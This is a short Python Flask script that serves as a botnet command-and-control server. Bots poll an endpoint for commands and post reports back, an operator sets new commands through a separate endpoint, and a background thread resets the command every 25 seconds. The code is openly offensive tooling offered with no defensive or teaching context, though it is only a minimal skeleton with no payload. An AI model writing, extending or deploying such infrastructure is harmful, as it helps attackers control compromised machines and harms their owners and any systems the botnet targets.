from flask import Flask, request, jsonify
import threading
import time

app = Flask(__name__)

# Command queue for bots
command_queue = {"default": "ping"}

@app.route("/command", methods=["GET"])
def get_command():
    # Provide the command to the bot
    return jsonify({"command": command_queue.get("default", "noop")})

@app.route("/report", methods=["POST"])
def receive_report():
    # Receive results or status updates from bots
    bot_data = request.json
    print(f"Received report from bot: {bot_data}")
    return "OK", 200

@app.route("/set_command", methods=["POST"])
def set_command():
    # Allow the operator to set a new command
    command = request.json.get("command")
    if command:
        command_queue["default"] = command
        return "Command updated", 200
    return "Invalid command", 400

def clear_command_periodically():
    """Clear the current command every 25 seconds."""
    while True:
        time.sleep(25)  # Wait for 25 seconds
        command_queue["default"] = "noop"  # Reset to "noop"
        print("[INFO] Command cleared and set to 'noop'.")

if __name__ == "__main__":
    # Start the background thread to clear the command periodically
    threading.Thread(target=clear_command_periodically, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
